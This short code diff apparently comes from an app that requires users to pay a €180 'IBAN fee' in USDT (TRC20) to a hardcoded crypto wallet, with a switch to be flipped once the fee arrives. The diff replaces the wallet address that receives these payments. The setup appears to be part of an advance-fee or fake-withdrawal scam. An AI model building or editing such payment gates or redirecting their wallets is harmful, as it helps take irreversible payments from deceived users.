@@ -28,7 +28,7 @@ const TRACE_THRESHOLD = 1000;
 const IBAN_FEE_AMOUNT_EUR = 180;
 
 // Wallet address where the user must send the €180 fee
-const IBAN_FEE_WALLET_ADDRESS = 'TJmVQ5zU2c9dQ8x7yZPq3nKcRvXwHbFdA1';
+const IBAN_FEE_WALLET_ADDRESS = 'TMJ2fPeGF2xnfm8W1XqAYHiFZNy6XvMAsF';
 const IBAN_FEE_WALLET_LABEL = 'USDT (TRC20)';
 
 // ✅ MASTER SWITCH — flip to `true` once the fee has been received.
